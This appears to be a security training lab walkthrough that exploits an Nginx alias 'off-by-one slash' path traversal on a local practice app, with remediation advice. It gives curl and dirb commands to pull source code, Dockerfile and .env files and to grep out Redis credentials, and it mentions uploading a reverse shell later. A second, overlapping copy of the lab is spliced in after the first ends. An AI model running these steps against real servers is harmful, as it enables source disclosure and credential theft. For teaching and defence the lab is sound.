# Lab 03 - Path Traversal Discovery via Nginx Misconfiguration

## Objective

Exploit an Nginx "off-by-one slash" misconfiguration on the `/static` directory to discover path traversal vulnerabilities and access files outside the intended directory scope.

## Background

Path traversal vulnerabilities occur when an application allows access to files and directories outside of the intended scope. A common Nginx misconfiguration involves the `alias` directive when combined with location blocks that don't have trailing slashes.

**The Vulnerability Pattern:**

When Nginx is configured like this:
```nginx
location /static {
    alias /app/static/;
}
```

Notice the `/static` location lacks a trailing slash, but the alias path has one. This creates an "off-by-one slash" vulnerability.

**How it's exploited:**
- Request: `GET /static../`
- Nginx resolves: `/app/static/` + `../`
- Final path: `/app/static/../` = `/app/`
- Result: Access to the parent directory!

This lab will teach you to systematically discover and exploit this misconfiguration.

## Steps

### 1. Recall Your Directory Discoveries

From Lab 02, you should have discovered the `/static/` directory using `dirb` with `common.txt`. If you need to verify:

```bash
dirb http://localhost:8080 common.txt
```

Expected output should include:
```
==> DIRECTORY: http://localhost:8080/static/
```

### 2. Test for Nginx Off-by-One Slash Misconfiguration

Now test if the `/static` location is vulnerable to the off-by-one slash bug:

```bash
# Try accessing /static.. (note the two dots but NO slash after static)
curl -I http://localhost:8080/static..

# Try with the trailing slash added
curl -I http://localhost:8080/static../
```

**What to look for:**
- HTTP 200 response = Potentially vulnerable
- HTTP 404 response = Not vulnerable or different configuration
- HTTP 301/302 = Redirection (investigate where it redirects)

### 3. Notice the Path Traversal Behavior

If the `/static../` endpoint returns different results than `/static/`, you've found the path traversal:

```bash
# Normal static directory
curl -v http://localhost:8080/static/

# Path traversal attempt
curl -v http://localhost:8080/static../
```

**Compare:**
- Do they return different content?
- Different directory listings?
- Different error messages?

### 4. Test Path Traversal with dirb - Phase 1 (common.txt)

Use `dirb` to enumerate files accessible through the path traversal with the common wordlist:

```bash
dirb http://localhost:8080/static../ /usr/share/dirb/wordlists/common.txt
```

**Expected discoveries:**
```
+ http://localhost:8080/static../app.py (CODE:200)
+ http://localhost:8080/static../requirements.txt (CODE:200)
+ http://localhost:8080/static../Dockerfile (CODE:200)
```

**Why this works:**
- `dirb` tests: `http://localhost:8080/static../app.py`
- Nginx resolves: `/app/static/../app.py` = `/app/app.py`
- Result: Application source code exposed!

### 5. Manually Verify the Path Traversal

Confirm the vulnerability manually by accessing the discovered files:

```bash
# Try to access app.py
curl http://localhost:8080/static../app.py

# Try to access requirements.txt
curl http://localhost:8080/static../requirements.txt
```

**If successful, you should see:**
- `app.py`: Python/Flask application source code
- `requirements.txt`: Python package dependencies

### 6. Test Path Traversal with dirb - Phase 2 (common-web-server.txt)

Now use a more comprehensive web server-specific wordlist:

```bash
# Try with common web server files wordlist
dirb http://localhost:8080/static../ /usr/share/dirb/wordlists/common-web-server.txt
```

**Note:** If the wordlist doesn't exist at that path, try:
```bash
# Find wordlists on your system
find /usr -name "*.txt" -path "*/dirb/*" 2>/dev/null

# Or use a different wordlist location (common on macOS with Homebrew)
dirb http://localhost:8080/static../ /opt/homebrew/share/dirb/wordlists/common.txt
```

**Expected additional discoveries:**
- Configuration files
- Additional Python modules
- Docker-related files
- Web server configs

### 7. Download and Examine app.py (Flask Application)

Retrieve the main application file:

```bash
# Download app.py
curl http://localhost:8080/static../app.py -o app.py

# View the contents
cat app.py
```

**What to look for in app.py:**
- **Import statements**: What frameworks and libraries are used?
- **Database connections**: Look for connection strings
- **Redis references**: Search for Redis-related code
- **Routes/endpoints**: What URLs does the app handle?
- **File upload handling**: How are uploads processed?
- **Security controls**: Authentication, validation, etc.

**Search for specific items:**
```bash
# Look for Redis container references
grep -i "redis" app.py

# Look for database credentials
grep -i "password" app.py

# Look for file paths
grep -i "upload" app.py
grep -i "resume" app.py
```

### 8. Examine the Redis Container Reference

In the Flask app.py file, you should find a Redis connection string:

```python
# Example from app.py:
redis_client = redis.Redis(
    host='resume_crunch_redis_container',
    port=6379,
    password='your_redis_password',
    db=0
)
# Or as a connection string:
redis_url = 'redis://password@resume_crunch_redis_container:6379/0'
```

**Document these critical details:**
- **Redis host**: `resume_crunch_redis_container`
- **Redis port**: `6379`
- **Redis password**: (extract from the code)
- **Database number**: `0`

**Why this matters:**
- You now know Redis is being used
- You have the connection credentials
- You can potentially connect to Redis directly
- This will be crucial for exploitation in later labs

### 9. Check for Resumes Upload Folder Location

Search app.py for the upload directory configuration:

```bash
# Look for upload folder configuration
grep -i "upload.*folder\|upload.*dir\|UPLOAD.*PATH" app.py

# Look for resume storage paths
grep -i "resume.*path\|resume.*dir" app.py
```

**Example from app.py:**
```python
UPLOAD_FOLDER = '/app/resumes'
# or
app.config['UPLOAD_FOLDER'] = '/app/uploads/resumes'
```

**Document:**
- Upload folder path: `/app/resumes` (or whatever path you find)
- Can we access it via path traversal?: Test with `curl http://localhost:8080/static../resumes/`

### 10. Create a Path Traversal Exploitation Report

Document your findings:

```bash
cat > path-traversal-report.md << 'EOF'
# Path Traversal Vulnerability Report - ResumeCrunch

## Vulnerability Summary
- **Type**: Nginx Alias Path Traversal (Off-by-One Slash)
- **Severity**: HIGH
- **Affected Endpoint**: `/static../`

## Root Cause
Nginx configuration uses `location /static` (no trailing slash) with `alias /app/static/` (with trailing slash), creating an off-by-one slash vulnerability.

## Exploitation
### Request
```
GET /static../app.py HTTP/1.1
Host: localhost:8080
```

### Response
HTTP 200 - Returns application source code

## Discovered Files via Path Traversal

### Phase 1: dirb with common.txt
- `app.py` - Flask application source code
- `requirements.txt` - Python dependencies
- `Dockerfile` - Container configuration

### Phase 2: dirb with common-web-server.txt
- (List additional files discovered)

## Critical Information Extracted from app.py

### Redis Configuration
- **Container name**: resume_crunch_redis_container
- **Port**: 6379
- **Password**: [REDACTED - found in source]
- **Database**: 0
- **Connection String**: redis://[password]@resume_crunch_redis_container:6379/0

### Upload Folder Location
- **Path**: /app/resumes (or /app/uploads/resumes)
- **Accessible via traversal**: Yes/No (test: /static../resumes/)

### Application Framework
- **Framework**: Flask (Python)
- **Version**: (check requirements.txt)

## Security Impact
1. **Complete Source Code Disclosure**: Full application logic exposed
2. **Credential Exposure**: Redis password discovered
3. **Infrastructure Mapping**: Container names and architecture revealed
4. **Path Information**: Upload directories and file locations known
5. **Attack Surface Expansion**: Enables further exploitation (Redis attacks, file manipulation)

## Proof of Concept
```bash
# Discover path traversal
curl http://localhost:8080/static../

# Extract source code
curl http://localhost:8080/static../app.py

# Verify Redis credentials
grep -i "redis" app.py
```

## Remediation
1. Fix Nginx configuration: Add trailing slash to location directive
   ```nginx
   location /static/ {
       alias /app/static/;
   }
   ```
2. Implement proper access controls
3. Do not expose source code files
4. Use environment variables for credentials (not hardcoded)

## Next Steps
- Enumerate all accessible files via path traversal
- Obtain Docker configuration files (Dockerfile, docker-compose.yml)
- Extract all credentials and configuration
- Prepare for Redis exploitation
EOF
```

### 11. Test Access to Resume Upload Folder

Try to access the resumes you uploaded in Lab 01:

```bash
# List the resumes directory (if directory listing is enabled)
curl http://localhost:8080/static../resumes/

# Try to download a specific resume file you uploaded
curl http://localhost:8080/static../resumes/sample_resume.txt
```

**Can you access your uploaded resumes?**
- Yes = Major security issue (uploaded files exposed)
- No = Directory not accessible or different path

**Why this matters:**
- If we can access uploaded files, we can later upload malicious files
- We could upload a reverse shell and then execute it
- This becomes critical for the final exploitation phase

## Understanding the Nginx Misconfiguration

### Vulnerable Configuration
```nginx
location /static {
    alias /app/static/;
}
```

### How the Exploit Works

**Normal request:**
```
Request: GET /static/style.css
Nginx resolves: /app/static/ + style.css = /app/static/style.css
Result: ✓ Correct
```

**Path traversal request:**
```
Request: GET /static../app.py
Nginx resolves: /app/static/ + ../app.py = /app/app.py
Result: ✗ Parent directory exposed!
```

### Secure Configuration
```nginx
location /static/ {
    alias /app/static/;
}
```

The trailing slash on both the location and alias prevents the traversal.

## Verification Checklist

- [ ] Tested `/static../` and confirmed path traversal vulnerability
- [ ] Ran `dirb` with `common.txt` against `/static../`
- [ ] Discovered `app.py` via path traversal
- [ ] Downloaded and examined `app.py`
- [ ] Found Redis container reference in source code
- [ ] Extracted Redis credentials (host, port, password, DB)
- [ ] Identified resumes upload folder location
- [ ] Ran `dirb` with `common-web-server.txt` wordlist (if available)
- [ ] Tested access to uploaded resume files
- [ ] Documented all findings in exploitation report

## Key Discoveries Summary

By the end of this lab, you should have:

1. **Confirmed the vulnerability**: `/static../` allows path traversal
2. **Obtained app.py**: Flask application source code
3. **Redis connection details**:
   - Host: `resume_crunch_redis_container`
   - Port: `6379`
   - Password: (from source code)
   - Database: `0`
4. **Upload folder path**: `/app/resumes` (or similar)
5. **Can access uploads**: Yes/No (test results)

## Questions to Answer

1. Why does `/static../` work but `/static/` doesn't expose parent files?
2. What Flask framework version is the application using?
3. Where is the Redis server running (container name)?
4. What is the Redis password?
5. Where are uploaded resumes stored?
6. Can you access previously uploaded resume files?
7. What other files can you discover through path traversal?
8. How would you fix this vulnerability in the Nginx config?

## Next Steps

Now that you've discovered the Flask application source code and found Redis credentials, proceed to [Lab 04 - Extract Docker Configuration Files](lab-04-locate-source.md) to use `dirb` with Docker-specific wordlists to find:
- `Dockerfile`
- `docker-compose.yml`
- `nginx.conf`
- `redis.conf`
- Complete `requirements.txt`
- Any other configuration files

These files will provide a complete picture of the infrastructure and help identify additional attack vectors.

---

[← Previous: Interrogate Server](lab-02-interrogate-server.md) | [Next: Extract Docker Files →](lab-04-locate-source.md)

```bash
# Test the path traversal (replace 'static' with your vulnerable directory)
curl -v http://localhost:8080/static../

# Try to access application files
curl http://localhost:8080/static../app.py
curl http://localhost:8080/static../requirements.txt
```

**Why does this work?**

This is a classic Nginx alias misconfiguration vulnerability. The server is configured with something like:
```nginx
location /static {
    alias /app/static/;
}
```

When you request `/static../`, Nginx resolves this as `/app/static/../` which becomes `/app/`, exposing the entire application directory!

### 5. Extract the Critical Files

Now retrieve the files you've discovered:

```bash
# Save requirements.txt (you'll need this for Lab 04!)
curl http://localhost:8080/static../requirements.txt -o requirements.txt

# View the application source code
curl http://localhost:8080/static../app.py

# Check for other files
curl http://localhost:8080/static../Dockerfile
curl http://localhost:8080/static../.env
```

### 6. Document Your Findings

Create a note of what you discovered:

```
Path Traversal Vulnerability Found!
====================================
Initial Scan: Discovered directories using common.txt wordlist
- /static/
- /help/
- /resumes/

Path Traversal Testing: Tested each directory with ../ pattern
- /static../ - VULNERABLE! ✓
- /help../ - Not vulnerable
- /resumes../ - Not vulnerable

Vulnerable Endpoint: /static../
Root Cause: Nginx alias misconfiguration on /static location

Accessible Files via /static../:
- app.py (application source code)
- requirements.txt (Python dependencies)
- Dockerfile (container configuration)

Security Impact: HIGH
- Complete source code disclosure
- Dependency information exposed
- Potential for discovering sensitive configuration files
```

## Understanding the Two-Phase Discovery Process

### Phase 1: Standard Directory Enumeration
Using `dirb` with common wordlists reveals the "intended" structure:
- `/static/` - For CSS, JS, images
- `/help/` - Help documentation
- `/resumes/` - Resume storage/processing

### Phase 2: Path Traversal Testing
Testing each directory with `../` reveals misconfigurations:
- Most directories: properly configured (returns 404 or redirects)
- `/static../`: **Vulnerable!** Exposes parent directory

### Why Only `/static` is Vulnerable?

The vulnerability exists because of how the Nginx `alias` directive is configured:

**Vulnerable `/static` Configuration:**
```nginx
location /static {
    alias /app/static/;
}
```

**Secure `/help` Configuration:**
```nginx
location /help/ {
    alias /app/help/;
}
```

**The difference:** The trailing slash in the `location` directive! The `/help/` path requires the trailing slash, preventing the `../` traversal.

## Alternative Testing Method (Custom Wordlist)

If you want to automate the path traversal testing, you can create a custom wordlist:

```bash
# Create wordlist with path traversal patterns for discovered directories
cat > traversal-wordlist.txt << EOF
static../
help../
resumes../
uploads../
admin../
api../
EOF

# Run dirb with the traversal wordlist
dirb http://localhost:8080 traversal-wordlist.txt
```

This will test multiple directories at once, but manual testing (as shown in steps 2-3) helps you understand what's happening!

## Understanding the Vulnerability

### What is an Nginx Alias Misconfiguration?

The vulnerability occurs when Nginx's `alias` directive is used without proper path validation:

**Vulnerable Configuration:**
```nginx
location /static {
    alias /app/static/;
}
```

**What happens:**
1. Request: `GET /static../app.py`
2. Nginx processes: `/app/static/` + `../app.py`
3. Resolves to: `/app/app.py`
4. Result: Source code exposed!

**Secure Configuration:**
```nginx
location /static/ {
    alias /app/static/;
}
```
Note the trailing slash on the location path - this prevents the traversal.

## Key Discoveries from the Lab

By following the two-phase discovery process, you should have found:

**Phase 1 - Standard directories** (via `dirb` with common.txt):
- `/static/` - Static files directory
- `/help/` - Help/documentation
- `/resumes/` - Resume processing area

**Phase 2 - Path traversal on each directory** (via `dirb http://localhost:8080/<dir>../`):
- `/help../` - Not vulnerable (404 or proper redirect)
- `/resumes../` - Not vulnerable (404 or proper redirect)
- `/static../` - **VULNERABLE!** Exposes application files:

  1. **app.py** - The main Flask application source code
     ```bash
     curl http://localhost:8080/static../app.py
     ```

  2. **requirements.txt** - Python package dependencies (critical for next lab!)
     ```bash
     curl http://localhost:8080/static../requirements.txt
     ```

  3. **Dockerfile** - Container configuration
     ```bash
     curl http://localhost:8080/static../Dockerfile
     ```

## Expected Findings Summary

**Step 1 Results** - Initial `dirb` scan with common.txt:
```
==> DIRECTORY: http://localhost:8080/static/
==> DIRECTORY: http://localhost:8080/help/
==> DIRECTORY: http://localhost:8080/resumes/
```

**Step 2 Results** - Path traversal testing on each directory:
```
# dirb http://localhost:8080/help../
[Empty results or 404s - Not vulnerable]

# dirb http://localhost:8080/resumes../
[Empty results or 404s - Not vulnerable]

# dirb http://localhost:8080/static../
+ http://localhost:8080/static../app.py (CODE:200)
+ http://localhost:8080/static../requirements.txt (CODE:200)
+ http://localhost:8080/static../Dockerfile (CODE:200)
[VULNERABLE! Files exposed!]
```

## Verification Checklist

- [ ] Ran initial `dirb` scan with common.txt wordlist
- [ ] Identified discovered directories (static, help, resumes)
- [ ] Tested each directory for path traversal with `dirb http://localhost:8080/<dir>../`
- [ ] Identified `/static../` as the vulnerable endpoint
- [ ] Retrieved `app.py` via `/static../app.py`
- [ ] Retrieved `requirements.txt` via `/static../requirements.txt` (**Essential for next lab!**)
- [ ] Understood why only `/static` is vulnerable (missing trailing slash)
- [ ] Documented findings with security impact assessment

## Questions to Answer

1. What directories did you discover in the initial `dirb` scan?
2. Which directory was vulnerable to path traversal? Why only that one?
3. What's the difference between `/static` and `/help/` configurations that makes one vulnerable?
4. What sensitive information is contained in `app.py`?
5. What Python packages are listed in `requirements.txt`?
6. How could this vulnerability be prevented in the Nginx configuration?
7. What other files might be accessible through this path traversal?
8. Could you access system files like `/etc/passwd` through this vulnerability?

## Security Impact

**Severity:** HIGH

**Why this matters:**
- **Source Code Disclosure:** Attackers can read `app.py` to understand application logic, find other vulnerabilities, and discover hardcoded secrets
- **Dependency Information:** `requirements.txt` reveals exact library versions, enabling targeted exploits against known CVEs
- **Configuration Exposure:** May reveal database credentials, API keys, and other sensitive data
- **Attack Chain:** This discovery enables the next phase of exploitation (analyzing dependencies for vulnerabilities)

## Next Steps

Now that you've discovered `requirements.txt` and `app.py` through the two-phase process (standard enumeration + path traversal testing), proceed to [Lab 04 - Locate Source Code and Requirements](lab-04-locate-source.md) to:
- Analyze the application dependencies in detail
- Identify vulnerable packages with known CVEs
- Prepare for targeted exploitation

**Key Takeaway:** The systematic approach of first discovering directories with `dirb` using common.txt, then testing each directory for path traversal vulnerabilities (`/static../`, `/help../`, etc.), revealed the Nginx alias misconfiguration on `/static` that exposed the entire application directory!

---

[← Previous: Interrogate Server](lab-02-interrogate-server.md) | [Next: Locate Source Code →](lab-04-locate-source.md)
